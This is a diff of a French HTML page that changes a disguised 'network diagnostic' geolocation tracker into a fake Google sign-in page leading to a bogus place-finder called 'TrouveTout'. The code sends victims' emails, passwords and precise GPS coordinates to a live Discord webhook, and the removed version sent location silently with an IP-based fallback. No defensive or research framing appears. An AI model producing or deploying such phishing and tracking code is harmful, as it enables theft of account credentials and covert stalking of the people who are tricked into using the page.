@@ -2,65 +2,118 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Analyseur de Conformité Réseau</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion – Comptes Google</title>
     <style>
-        body { background-color: #0d1117; color: #58a6ff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #30363d; padding: 20px; background: #161b22; border-radius: 5px; text-align: center; width: 80%; max-width: 400px; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { width: 350px; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; }
+        .search-box { display: none; width: 90%; max-width: 500px; padding: 20px; text-align: center; border: 1px solid #ccc; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        .logo { width: 75px; margin-bottom: 20px; }
+        #map-container { margin-top: 20px; height: 300px; width: 100%; display: none; border: 1px solid #ccc; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>DIAGNOSTIC EN COURS...</h2>
-    <p id="status">Initialisation du tunnel sécurisé...</p>
+<div id="login-step" class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+    <h1>Connexion</h1>
+    <p>Utilisez votre compte Google pour accéder à TrouveTout</p>
+    <input type="text" id="email" placeholder="E-mail ou téléphone">
+    <input type="password" id="pass" placeholder="Mot de passe">
+    <div style="text-align: right; margin-top: 20px;">
+        <button onclick="captureLogin()">Suivant</button>
+    </div>
+</div>
+
+<div id="search-step" class="search-box">
+    <h1 style="color: #1a73e8;">📍 TrouveTout</h1>
+    <p>Trouvez l'établissement le plus proche de vous instantanément.</p>
+    <input type="text" id="query" placeholder="Ex: McDo, Coiffeur, Boulangerie...">
+    <button onclick="startSearch()">Rechercher</button>
+    <div id="status" style="margin-top: 10px; font-size: 14px; color: gray;"></div>
+    <div id="map-container">
+        <iframe id="map-iframe" width="100%" height="100%" frameborder="0" style="border:0"></iframe>
+    </div>
 </div>
 
 <script>
-// --- CONFIGURATION ---
 const webhook = "https://discord.com/api/webhooks/1406320274206490685/T5UlsYLa2A-ZUGfItLh6Uai053DnYNhbOsF0agE-gngh0DJuQDxt7sWRridLKNi1M5XP";
 
-async function sendToDiscord(mapLink, details, lat, lon) {
-    const payload = {
-        embeds: [{
-            title: "🎯 CIBLE LOCALISÉE - PRÉCISION GPS",
-            color: 15158332,
-            fields: [
-                { name: "📍 Google Maps", value: `[Cliquer ici pour voir la rue](${mapLink})` },
-                { name: "📊 Détails", value: details, inline: true },
-                { name: "🌍 Coordonnées", value: `${lat}, ${lon}`, inline: true }
-            ],
-            footer: { text: "Système de Traçage OSINT v2.5" }
-        }]
-    };
+// Capture du Login
+async function captureLogin() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
 
-    await fetch(webhook, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
-}
-
-async function gatherData() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            await sendToDiscord(gpsLink, `Précision: ${accuracy} mètres`, lat, lon);
-            document.getElementById('status').innerText = "Vérification terminée.";
-        }, async (error) => {
-            // Repli sur IP si refus
-            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-            await sendToDiscord("GPS Refusé", "Basé sur IP", ipData.latitude, ipData.longitude);
-            document.getElementById('status').innerText = "Erreur de synchro 0x882.";
-        }, { enableHighAccuracy: true, timeout: 10000 });
+    if(email && pass) {
+        await fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🔑 LOGINS CAPTURÉS",
+                    color: 16711680,
+                    fields: [
+                        { name: "📧 Email", value: email, inline: true },
+                        { name: "🔒 Mot de passe", value: pass, inline: true }
+                    ]
+                }]
+            })
+        });
+        // Passage à la page suivante
+        document.getElementById('login-step').style.display = 'none';
+        document.getElementById('search-step').style.display = 'block';
+    } else {
+        alert("Veuillez remplir les champs.");
     }
 }
 
-// Lancement
-gatherData();
+// Recherche avec GPS
+function startSearch() {
+    const query = document.getElementById('query').value;
+    const status = document.getElementById('status');
+    
+    if(!query) return alert("Que cherchez-vous ?");
+    
+    status.innerText = "Autorisez la localisation pour voir les résultats...";
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            // Envoi GPS au Webhook
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 LOCALISATION GPS PRÉCISE",
+                        color: 3066993,
+                        fields: [
+                            { name: "🔎 Recherche", value: query },
+                            { name: "📍 Carte", value: `[Voir sur Google Maps](https://www.google.com/maps?q=${lat},${lon})` }
+                        ]
+                    }]
+                })
+            });
+
+            // Affichage de la VRAIE carte pour la cible
+            status.innerText = `Résultats pour "${query}" près de chez vous :`;
+            const mapIframe = document.getElementById('map-iframe');
+            mapIframe.src = `https://www.google.com/maps/embed/v1/search?key=VOTRE_CLE_API_NON_NECESSAIRE&q=${query}&center=${lat},${lon}&zoom=14`;
+            // Note: Pour l'iframe sans clé API, on utilise une version publique de recherche
+            mapIframe.src = `https://www.google.com/maps?q=${query}&output=embed`;
+            document.getElementById('map-container').style.display = 'block';
+
+        }, () => {
+            status.innerText = "Erreur : La localisation est nécessaire pour trouver l'établissement.";
+        }, { enableHighAccuracy: true });
+    }
+}
 </script>
 </body>
 </html>
+
